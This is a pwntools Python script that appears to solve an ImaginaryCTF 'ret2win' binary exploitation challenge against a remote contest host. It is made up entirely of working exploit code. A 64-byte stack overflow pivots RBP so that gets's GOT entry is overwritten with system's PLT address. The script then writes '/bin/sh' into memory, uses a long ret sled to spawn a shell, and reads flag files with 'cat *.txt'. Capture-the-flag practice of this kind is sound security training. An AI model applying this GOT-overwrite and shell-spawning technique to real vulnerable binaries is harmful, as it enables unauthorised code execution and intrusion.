from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.update(
    terminal='kitty',
    log_level='debug'
)

c = '''
set follow-fork-mode parent
bp do_system+353
c
'''

p = remote('ret2win.chal.imaginaryctf.org', 1337)
# p = elf.process()
# gdb.attach(p,c)

# resolve system but not useful
# payload = flat(
#     b'a'*64,
#     0x0000000000401179, # ret
#     0x0000000000401179, # ret
#     elf.sym.win,
#     elf.sym.main
# )
# p.sendline(payload)

payload = flat(
    b'a'*64,
    elf.got.gets+0x40,
    0x0000000000401179, # ret
    0x401162 # main -> lea rax, [rbp-0x40]
)
p.sendline(payload)

payload = flat(
    elf.plt.system,
    b'a'*0x30,
    b'/bin/sh\x00',
    0x404058+0x40, # RBP, -0x40 will be /bin/sh address
    0x0000000000401179,
    p64(0x0000000000401016)*401, # add rsp+8, ret
    0x0000000000401179, # ret
    0x0000000000401179, # ret
    0x0000000000401162 # lea rax [rbp-0x40]
)
p.sendline(payload)
p.sendline(b'cat *.txt')

p.interactive()